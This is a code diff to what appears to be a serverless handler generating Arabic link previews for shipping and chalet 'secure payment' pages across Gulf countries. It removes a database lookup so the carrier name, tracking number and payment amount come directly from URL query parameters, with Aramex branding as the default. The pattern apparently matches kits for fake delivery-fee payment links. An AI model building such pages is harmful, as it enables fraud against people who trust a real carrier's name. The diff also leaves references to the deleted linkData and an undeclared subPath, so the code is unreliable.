@@ -97,52 +97,18 @@ const countryData = {
   BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
 };
 
-// Supabase configuration
-const { createClient } = require('@supabase/supabase-js');
-
-const supabaseUrl = process.env.VITE_SUPABASE_URL;
-const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;
-
-const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;
-
-// Function to get link data from database
-async function getLinkData(linkId) {
-  if (!supabase) {
-    console.log('Supabase not configured, using fallback data');
-    return null;
-  }
-  
-  try {
-    const { data, error } = await supabase
-      .from('links')
-      .select('*')
-      .eq('id', linkId)
-      .single();
-    
-    if (error) {
-      console.error('Error fetching link data:', error);
-      return null;
-    }
-    
-    return data;
-  } catch (error) {
-    console.error('Error in getLinkData:', error);
-    return null;
-  }
-}
-
 exports.handler = async (event, context) => {
   const { path, queryStringParameters } = event;
   
   // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
-  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
+  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([^/?#]+)$/);
   let countryCode, type, id;
   
   if (pathMatch) {
     [, countryCode, type, id] = pathMatch;
   } else {
     // Handle payment page routes: /pay/:id/...
-    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
+    pathMatch = path.match(/^\/pay\/([^/?#]+)\/(.+)$/);
     if (pathMatch) {
       [, id, subPath] = pathMatch;
       // For payment pages, we need to determine the type from the link data
@@ -156,78 +122,78 @@ exports.handler = async (event, context) => {
     }
   }
   
-  const country = countryData[countryCode];
+  let country = countryData[countryCode];
   
+  if (queryStringParameters?.country) {
+    const queryCountry = queryStringParameters.country.toUpperCase();
+    if (countryData[queryCountry]) {
+      countryCode = queryCountry;
+      country = countryData[queryCountry];
+    }
+  }
+
   if (!country) {
     return {
       statusCode: 404,
       body: 'Country not found'
     };
   }
-  
-  // Try to get link data from database first
-  const linkData = await getLinkData(id);
-  
-  // For payment pages, get country and type from link data if available
-  if (linkData?.country_code) {
-    countryCode = linkData.country_code;
-    const linkCountry = countryData[countryCode];
-    if (linkCountry) {
-      country = linkCountry;
-    }
+
+  if (queryStringParameters?.type) {
+    type = queryStringParameters.type;
   }
-  
-  if (linkData?.type) {
-    type = linkData.type;
-  }
-  
-  // Debug logging
-  console.log('Link ID:', id);
-  console.log('Link Data:', linkData);
-  console.log('Query Parameters:', queryStringParameters);
-  console.log('Final Country:', countryCode, 'Type:', type);
-  
+ 
   let title = "";
   let description = "";
   let ogImage = "/og-aramex.jpg";
   let serviceKey = 'aramex'; // fallback
+  const amountFromQuery = queryStringParameters?.amount ? decodeURIComponent(queryStringParameters.amount) : null;
+  const trackingFromQuery = queryStringParameters?.tracking ? decodeURIComponent(queryStringParameters.tracking) : null;
+  const serviceNameFromQuery = queryStringParameters?.service_name ? decodeURIComponent(queryStringParameters.service_name) : null;
   
   if (type === "shipping") {
     // Determine service key from multiple sources
-    if (linkData?.payload?.service_key) {
-      serviceKey = linkData.payload.service_key;
-      console.log('Using service_key from payload:', serviceKey);
-    } else if (linkData?.payload?.service) {
-      serviceKey = linkData.payload.service;
-      console.log('Using service from payload:', serviceKey);
-    } else if (queryStringParameters?.service) {
+    if (queryStringParameters?.service) {
       serviceKey = queryStringParameters.service;
       console.log('Using service from query params:', serviceKey);
     } else {
       console.log('Using fallback service:', serviceKey);
     }
     
+    serviceKey = (serviceKey || 'aramex').toLowerCase();
     const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
-    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
+    const serviceName = serviceNameFromQuery || serviceInfo.name;
+    const [arabicName] = serviceName.split(' - ');
+    const serviceDisplayName = (arabicName || serviceName || 'حلول الشحن').trim();
     
     console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
     
     // Determine if this is a payment page or microsite
     const isPaymentPage = path.startsWith('/pay/');
-    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
-    
-    title = `${pageType} - ${serviceName}`;
-    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
+    const pageTitleSuffix = isPaymentPage ? 'رابط الدفع الآمن' : 'تتبع الشحنة والدفع';
+
+    title = `${serviceDisplayName} | ${pageTitleSuffix}`;
+    description = `${serviceDisplayName} - ${serviceInfo.description}. ${
+      isPaymentPage
+        ? 'أكمل الدفع وتتبع الشحنة عبر الرابط الآمن الموثوق.'
+        : 'شارك رابط التتبع مع عميلك لمتابعة الشحنة أولاً بأول.'
+    }`;
     ogImage = serviceInfo.ogImage;
     
-    // Add tracking number to description if available
-    if (linkData?.payload?.tracking_number) {
-      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
+    const trackingReference = trackingFromQuery;
+    const amountReference = amountFromQuery;
+
+    const sanitizedTracking = trackingReference ? `${trackingReference}`.trim() : null;
+    const sanitizedAmount = amountReference !== null && amountReference !== undefined
+      ? `${amountReference}`.toString().replace(/[^0-9.,]/g, '')
+      : null;
+
+    if (sanitizedTracking) {
+      description += ` • رقم التتبع: ${sanitizedTracking}`;
     }
-    
-    // Add COD amount if available
-    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
-      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
+
+    if (sanitizedAmount) {
+      description += ` • مبلغ الدفع: ${sanitizedAmount} ر.س`;
     }
   } else if (type === "chalet") {
     const chaletName = linkData?.payload?.chalet_name || 'شاليه';
@@ -236,11 +202,6 @@ exports.handler = async (event, context) => {
     
     title = `${pageType} - ${chaletName} في ${country.nameAr}`;
     description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
-    
-    // Add guest count and nights if available
-    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
-      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
-    }
     
     ogImage = "/og-aramex.jpg"; // Default for chalets
   }
